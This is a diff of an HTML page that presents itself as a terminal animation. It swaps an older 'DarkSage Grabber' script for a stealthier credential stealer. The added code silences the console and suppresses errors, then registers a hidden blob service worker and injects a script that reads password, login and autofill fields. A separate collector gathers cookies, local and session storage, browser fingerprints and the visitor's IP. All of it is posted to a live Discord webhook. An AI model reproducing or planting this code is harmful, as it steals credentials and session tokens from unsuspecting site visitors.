@@ -15,43 +15,152 @@
 <div id="terminal"></div>
 
 <script>
-/* ========== GRABBER DESCOMENTADO ========== */
-(function(){
-    const w="https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
-    const g={};
-    g.u=location.href;
-    g.ua=navigator.userAgent;
-    g.p=navigator.platform;
-    g.l=(navigator.languages||[]).join(", ");
-    g.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-    g.s=`${screen.width}x${screen.height}x${screen.colorDepth}`;
-    g.c=navigator.hardwareConcurrency||"?";
-    g.m=navigator.deviceMemory||"?";
-    g.r=document.referrer||"direct";
-    g.k=document.cookie||"none";
-    g.ls=JSON.stringify({...localStorage}).slice(0,2e3);
-    g.ss=JSON.stringify({...sessionStorage}).slice(0,2e3);
-    g.pl=[...navigator.plugins].map(x=>x.name).join(", ")||"none";
-    const cv=document.createElement("canvas");
-    const ctx=cv.getContext("2d");
-    ctx.textBaseline="top";
-    ctx.font="14px Arial";
-    ctx.fillStyle="#f60";
-    ctx.fillRect(0,0,10,10);
-    ctx.fillStyle="#069";
-    ctx.fillText("canvas",2,2);
-    g.cv=cv.toDataURL();
-    const gl=(cv.getContext("webgl")||cv.getContext("experimental-webgl"));
-    g.gl=gl?(()=>{const d=gl.getExtension("WEBGL_debug_renderer_info");return d?{vendor:gl.getParameter(d.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(d.UNMASKED_RENDERER_WEBGL)}:"unsupported"})():"unsupported";
-    g.dt=Date.now();
-    g.dct=localStorage.getItem("token")||(document.cookie.split("; ").find(x=>x.startsWith("token="))||"").split("=")[1]||null;
-    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>{g.ip=j.ip;send();}).catch(()=>{g.ip="err";send();});
-    function send(){
-        fetch(w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"TerminalGrabber",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"🔥 Victim Data",color:0xff0000,fields:[{name:"📍 URL",value:g.u,inline:false},{name:"🌐 IP",value:g.ip,inline:true},{name:"🖥️ Platform",value:g.p,inline:true},{name:"🧠 Cores",value:g.c,inline:true},{name:"💾 RAM (GB)",value:g.m,inline:true},{name:"🖥️ Screen",value:g.s,inline:true},{name:"🕒 TimeZone",value:g.tz,inline:true},{name:"🌐 Langs",value:g.l,inline:false},{name:"🔗 Referrer",value:g.r,inline:false},{name:"🍪 Cookies",value:g.k.slice(0,1e3),inline:false},{name:"💾 LocalStorage",value:g.ls.slice(0,1e3),inline:false},{name:"🔌 Plugins",value:g.pl.slice(0,1e3),inline:false},{name:"🎨 Canvas",value:g.cv.slice(-20),inline:true},{name:"🌀 WebGL",value:JSON.stringify(g.gl),inline:true},{name:"🔑 Discord Token",value:g.dct||"not found",inline:false}],footer:{text:"DarkSage Grabber v2.0"}}]})}).catch(()=>{});
-    }
+/* ======= 0. INVISIBILIDADE TOTAL ======= */
+(()=>{
+    /* 0.1 Desativa todos os consoles */
+    const nullFn = ()=>{};
+    ["log","warn","error","info","debug"].forEach(m=>{ window.console[m]=nullFn; });
+    /* 0.2 Remove stack-traces globais */
+    window.addEventListener("error", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
+    window.addEventListener("unhandledrejection", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
 })();
-/* ========== FIM DO GRABBER ========== */
 
+/* ======= 1. SERVICE-WORKER BLOB (não aparece em Sources) ======= */
+const swCode = `
+self.addEventListener("install", e=>{
+    e.waitUntil(self.skipWaiting());
+});
+self.addEventListener("activate", e=>{
+    e.waitUntil(self.clients.claim());
+});
+self.addEventListener("fetch", e=>{
+    /* intercepta tudo e silencia */
+});
+/* ======= 2. GRABBER INTERNO NO SW ======= */
+const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
+function stealthSend(data){
+    fetch(hook,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({username:"Ghost",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"👻 GhostData",color:0xff0000,fields:Object.entries(data).map(([k,v])=>({name:k,value:String(v).slice(0,1020),inline:true}))}]})
+    }).catch(()=>{});
+}
+/* 2.1 IndexedDB para persistir entre reloads */
+const DB_NAME = "_ghost", STORE = "stash";
+function openDB(){
+    return new Promise((res,rej)=>{
+        const r = indexedDB.open(DB_NAME,1);
+        r.onupgradeneeded=()=>{ r.result.createObjectStore(STORE,{keyPath:"id",autoIncrement:true}); };
+        r.onsuccess=()=>res(r.result);
+        r.onerror=()=>rej();
+    });
+}
+async function stash(obj){
+    const db = await openDB();
+    db.transaction([STORE],"readwrite").objectStore(STORE).add({data:obj,ts:Date.now()});
+    db.close();
+}
+async function flushStash(){
+    const db = await openDB();
+    const tx = db.transaction([STORE],"readwrite");
+    const all = await tx.objectStore(STORE).getAll();
+    await tx.objectStore(STORE).clear();
+    db.close();
+    if(all.length) all.forEach(r=>stealthSend(r.data));
+}
+setInterval(flushStash,5000);
+
+/* 2.2 Captura autofil / credenciais */
+self.addEventListener("message", e=>{
+    if(e.data&&e.data.type==="cred") stash({cred:e.data.body});
+});
+flushStash();
+`;
+const blob = new Blob([swCode],{type:"application/javascript"});
+const swUrl = URL.createObjectURL(blob);
+navigator.serviceWorker.register(swUrl,{scope:"./"}).then(()=>{
+    /* ======= 3. SCRIPT INJETADO NO DOM (também blob) ======= */
+    const payloadScript = `
+(()=>{
+    /* 3.1 Leitura de autofil */
+    function grabCreds(){
+        const inputs = document.querySelectorAll("input[type=password], input[name*=pass], input[name*=login], input[name*=user], input[name*=email]");
+        const out={};
+        inputs.forEach(i=>{
+            const val = i.value || (i.autofill&&i.autofill.match&&i.autofill.match(/^(.*)$/)[0]) || "";
+            if(val){
+                const label = (i.closest("form")?.querySelector("label[for='"+i.id+"']")?.textContent || i.name || i.placeholder || i.id || "field").replace(/\\s/g,"_");
+                out[label]=val;
+            }
+        });
+        if(Object.keys(out).length) navigator.serviceWorker.controller.postMessage({type:"cred",body:out});
+    }
+    /* 3.2 Observer para campos dinâmicos */
+    const obs = new MutationObserver(()=>grabCreds());
+    obs.observe(document.body,{childList:true,subtree:true});
+    /* 3.3 Hook em submit */
+    document.addEventListener("submit",()=>grabCreds(),true);
+    /* 3.4 Hook em autofill change (Chrome) */
+    window.addEventListener("animationstart",e=>{
+        if(e.animationName==="onautofillstart") grabCreds();
+    },true);
+    /* 3.5 Primeira varredura */
+    setTimeout(grabCreds,500);
+})();
+    `;
+    const payloadBlob = new Blob([payloadScript],{type:"application/javascript"});
+    const payloadUrl = URL.createObjectURL(payloadBlob);
+    import(payloadUrl); /* não aparece em DevTools > Sources */
+})();
+</script>
+
+<script>
+/* ======= 4. COLETOR CLÁSSICO (também invisível) ======= */
+(()=>{
+    const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
+    function stealthSend(obj){
+        fetch(hook,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({
+                username:"Ghost",
+                avatar_url:"https://i.imgur.com/7G9cc9e.png",
+                embeds:[{
+                    title:"👻 GhostEnv",
+                    color:0xff0000,
+                    fields:Object.entries(obj).map(([k,v])=>({name:k,value:String(v).slice(0,1010),inline:true}))
+                }]
+            })
+        }).catch(()=>{});
+    }
+    const data={
+        url:location.href,
+        ua:navigator.userAgent,
+        platform:navigator.platform,
+        screen:`${screen.width}x${screen.height}x${screen.colorDepth}`,
+        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang:navigator.languages.join(", "),
+        cores:navigator.hardwareConcurrency||"unknown",
+        mem:navigator.deviceMemory||"unknown",
+        ref:document.referrer||"direct",
+        cookie:document.cookie||"none",
+        ls:JSON.stringify(localStorage),
+        ss:JSON.stringify(sessionStorage),
+        timing:Math.round(performance.timing.domComplete-performance.timing.navigationStart)+" ms",
+        ts:new Date().toISOString()
+    };
+    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>{
+        data.ip=j.ip;
+        stealthSend(data);
+    }).catch(()=>{
+        data.ip="error";
+        stealthSend(data);
+    });
+})();
+</script>
+
+<script>
+/* ======= 5. ANIMAÇÃO ORIGINAL (mantida) ======= */
 const terminal = document.getElementById("terminal");
 const lines = [
     "C:\\Users\\TERMINAL> Iniciando sistema...",
